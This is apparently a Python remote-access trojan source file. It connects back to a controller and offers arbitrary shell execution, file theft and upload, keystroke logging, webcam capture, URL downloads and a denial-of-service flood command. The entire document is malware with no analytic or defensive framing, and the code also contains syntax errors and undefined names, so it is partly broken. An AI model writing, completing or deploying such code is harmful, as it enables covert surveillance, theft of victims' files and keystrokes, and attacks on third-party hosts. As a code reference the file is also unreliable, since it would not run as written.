import socket
import os
import sys
import subprocess
import pythoncom, pyHook
import thread
import cv2
import numpy

log_file = "keylogs.txt"
logging = False
def OnKeyboardEvent(event):
    global keylogs
    keylogs = ""
    if event.Ascii == 8:
        keylogs+="[BACKSPACE]"
    elif event.Ascii == 13:
        keylogs+="\n"
    else:
        keylogs += chr(event.Ascii)
    

def ddos(host):
    try:
        dsock = socket.socket()
        dsock.connect((host, 80))
        dsock.close()
    except:
        pass
        


host = "127.0.0.1"
port = 5565

while True:
    try:
        s = socket.socket()
        s.connect((host, port))
        complete_output = ""

        while True:
            data = s.recv(1024)
            if not data: break
            
            else:
                if data.startswith("cd") == True:
                    try:
                        os.chdir(data[3:]).replace('\n', '')
                        complete_output = ""
                    except:
                        complete_output = "Error opening directory!!"

                elif data.startswith("download") == True:
                    if os.path.isfile(data[9:]).replace('\n', ''):
                        f = open(data[9:], "rb")
                        fname = f.read()
                        f.close()
                        s.sendall(fname)
                        complete_output = "Download finished!!"
                    else: complete_output = "File does not exist in this directory!!"

                elif data.startswith("upload") == True:
                    f2 = open(data[7:], "wb")
                    while fcontents != "":
                        fcontents = s.recv(1024)
                        f2.write(fcontents)
                    f2.close()
                    complete_output = "Upload finished!!"

                
                elif data.startswith("keylog") == True:
                    f3 = open(log_file, "w")
                    if logging == False:
                        try:
                            logging = True
                            hm = pyHook.HookManager()
                            hm.KeyDown = OnKeyboardEvent
                            hm.HookKeyboard()
                            pythoncom.PumpMessages()                    
                            complete_output = "Logging keystrokes..."
                        except:
                            f3.write(keylogs)
                            f3.close()
                            logging == False

                elif data.startswith("dos") == True:
                    while True:
                        start_new_thread(ddos, (data[4:], ))
                                    
                elif data == "quit": break
                    complete_output = "Session terminated!!"

                elif data.startswith("downhttp") == True:
                    filename = url.split('/')[-1].split('#')[0].split('?')[0]
                    g = open(filename, 'wb')
                    u = urllib2.urlopen(url)
                    g.write(u.read())
                    g.close()
                    complete_output = "Finished downloading!!"
                elif data == "webcam":
                    capture = cv2.VideoCapture(0)
                    ret, frame = capture.read()
                    cv2.imwrite("image.jpg", frame)
                    capture.release()
                    g = open("image.jpg", "rb")
                    complete_output = g.read()
                    g.close()
                    os.remove("image.jpg")
                    
                else:
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    cmd_output = cmd.stdout.read() + cmd.stderr.read()
                    complete_output = cmd_output

                complete_output = complete_output + "\n" + os.getcwd() + "> "
                s.send(complete_output)
                
        except:
            pass

